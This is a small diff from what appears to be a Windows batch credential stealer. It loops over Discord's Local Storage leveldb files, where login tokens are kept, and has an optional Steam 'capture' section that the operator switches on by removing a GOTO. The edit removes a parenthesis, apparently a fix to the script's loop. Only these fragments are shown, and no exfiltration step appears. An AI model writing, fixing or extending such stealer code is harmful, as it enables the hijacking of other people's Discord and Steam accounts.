@@ -197,7 +197,6 @@ for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
 		
 		timeout /t 2 /nobreak > NUL
 	)
-)
 :skipdiscord
 
 :: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
